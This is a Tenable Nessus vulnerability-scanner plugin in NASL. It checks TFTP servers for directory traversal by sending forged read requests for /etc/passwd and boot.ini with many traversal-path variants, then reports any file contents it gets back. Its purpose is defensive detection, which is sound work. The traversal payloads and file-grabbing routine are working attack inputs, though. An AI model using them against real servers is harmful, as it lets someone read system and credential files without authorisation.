#
# (C) Tenable Network Security, Inc.
#

# This script replaces the old C plugin "tftp_grab_file".
#
# References:
# From:	Luigi Auriemma <aluigi@autistici.org>
# To:	bugtraq@securityfocus.com, full-disclosure@lists.grok.org.uk,
#	packet@packetstormsecurity.org,cert@cert.org,news@securiteam.com
# Date:	Wed, Apr 2, 2008 at 8:42 PM
# Subject: Directory traversal in LANDesk Management Suite 8.80.1.1
#
# From:	Luigi Auriemma <aluigi@autistici.org>
# To:	bugtraq@securityfocus.com,full-disclosure@lists.grok.org.uk,
#	packet@packetstormsecurity.org,cert@cert.org,news@securiteam.com,
# Date:	Mon, Mar 31, 2008 at 9:48 PM
# Subject: Directory traversal in 2X ThinClientServer v5.0_sp1-r3497
#


include("compat.inc");

if(description)
{
 script_id(18262);
 script_version ("$Revision: 1.25 $");

 script_cve_id("CVE-1999-0183", "CVE-1999-0498", "CVE-2002-2353", "CVE-2009-0271", "CVE-2009-0288", "CVE-2009-1161");
 script_bugtraq_id(6198, 11582, 11584, 33287, 33344);
 script_xref(name:"OSVDB", value:"11297");
 script_xref(name:"OSVDB", value:"11349");
 script_xref(name:"OSVDB", value:"51487");
 script_xref(name:"OSVDB", value:"57701");
 script_xref(name:"OSVDB", value:"51404");
 script_xref(name:"OSVDB", value:"11221");
 script_xref(name:"OSVDB", value:"8069");

 script_name(english: "TFTP Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote TFTP server can be used to read arbitrary files on the
remote host." );
 script_set_attribute(attribute:"description", value:
"The TFTP (Trivial File Transfer Protocol) server running on the remote
host is vulnerable to a directory traversal attack that allows an
attacker to read arbitrary files on the remote host by prepending
their names with directory traversal sequences." );
 script_set_attribute(attribute:"solution", value:
"Disable the remote TFTP daemon, run it in a chrooted environment, or
filter incoming traffic to this port." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();

 script_summary(english: "Attempts to grab a file through TFTP");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 script_family(english: "Misc.");
# Warning! We cannot depend upon tftpd_backdoor!
 script_dependencies('tftpd_detect.nasl');
 script_require_keys("Services/udp/tftp");
 exit(0);
}

#

include('global_settings.inc');
include('dump.inc');
include("tftp.inc");


if(islocalhost()) exit(0);	# ?
if ( TARGET_IS_IPV6 ) exit(0);

function tftp_grab(port, file)
{
 local_var	req, rep, sport, ip, u, filter, data, i;
 global_var	nb;

 req = '\x00\x01'+file+'\0netascii\0';
 sport = rand() % 64512 + 1024;

 ip = forge_ip_packet(ip_hl : 5, ip_v: 4,  ip_tos:0, 
	ip_len:20, ip_off:0, ip_ttl:64, ip_p:IPPROTO_UDP,
	ip_src: this_host());
		     
 u = forge_udp_packet(ip:ip, uh_sport: sport, uh_dport:port, uh_ulen: 8 + strlen(req), data:req);

 filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';

 data = NULL;
 for (i = 0; i < 2; i ++)	# Try twice
 {
  rep = send_packet(u, pcap_active:TRUE, pcap_filter:filter);
  if(rep)
  {
   if (debug_level > 2) dump(ddata: rep, dtitle: 'TFTP (IP)');
   data = get_udp_element(udp: rep, element:"data");
   if (debug_level > 1) dump(ddata: data, dtitle: 'TFTP (UDP)');
   if (data[0] == '\0' && data[1] == '\x03')
   {
     local_var	c;
     c = substr(data, 4);
     # debug_print('Content of ',file, "= ", c, '\n'r);
     set_kb_item(name: 'tftp/'+port+'/filename/'+ nb, value: file);
     set_kb_item(name: 'tftp/'+port+'/filecontent/'+ nb, value: c);
     nb ++;
     return c;
   }
   else
     return NULL;
  }
 }
 return NULL;
}

# function report_backdoor was moved to tftpd_backdoor.nasl

function report_and_exit(file, content, port)
{
 local_var report;

 set_kb_item(name: 'tftp/'+port+'/get_file', value: file);
 # Avoid a double report with the old C plugin
 if (get_kb_item('tftp/get_file')) exit(0);

  # Avoid biggest source of false alerts
  if (strlen(content) > 40 && substr(content, 0, 1) == 'MZ' && 
     'This program cannot be run in DOS mode' >< content )
  {
   debug_print('TFTP(', file, ') returned an MS EXE\n');
   return;
  }

 report = 'It was possible to retrieve the contents of the file\n' + file + ' from the remote host :\n\n' + content;
 security_warning(port: port, proto: "udp", extra: report);
 exit(0);
}

# 

port = get_kb_item('Services/udp/tftp');
if (! port) port = 69;
nb = 0;

exploits = make_list(
  '/etc/passwd', 
  '../../../../../etc/passwd'
);
foreach file (exploits)
{
 # Try using netascii mode.
 f = tftp_grab(port: port, file: file);
 # If that failed, try octet mode.
 if (isnull(f) || strlen(f) == 0)
   f = tftp_get(port:port, path:file); 
 if (strlen(f) > 0)
 {
  debug_print('Content of ', file, ': ', f, '\n');
  if (report_paranoia > 1 || egrep(string: f, pattern: "^.*:.*:.*:.*:"))
   report_and_exit(file: file, content: f, port: port);
 }
}

exploits = make_list(
  '../../../../../../boot.ini', 
  "..\..\..\..\..\..\boot.ini", 
  '.../.../.../.../.../.../boot.ini', 
  "...\...\...\...\...\...\boot.ini", 
  'x/../../../../../../boot.ini', 
  "x\..\..\..\..\..\..\boot.ini", 
  '/boot.ini', 
  "\boot.ini", 
  'C:/boot.ini', 
  "C:\boot.ini", 
  'boot.ini'
);
foreach file (exploits)
{
 # Try using netascii mode.
 f = tftp_grab(port: port, file: file);
 # If that failed, try octet mode.
 if (isnull(f)) f = tftp_get(port:port, path:file); 
 if (f)
 {
  #debug_print('Contents of ', f, ': ', file, '\n');
  if ( report_paranoia > 1 || 
       ("ECHO" >< f)          || ("SET " >< f)             ||
       ("export" >< f)        || ("EXPORT" >< f)           ||
       ("mode" >< f)          || ("MODE" >< f)             || 
       ("doskey" >< f)        || ("DOSKEY" >< f)           ||
       ("[boot loader]" >< f) || ("[fonts]" >< f)          ||
       ("[extensions]" >< f)  || ("[mci extensions]" >< f) ||
       ("[files]" >< f)       || ("[Mail]" >< f)           ||
       ("[operating systems]" >< f)              )
  {
   report_and_exit(file: file, content: f, port: port);
  }
 }
}
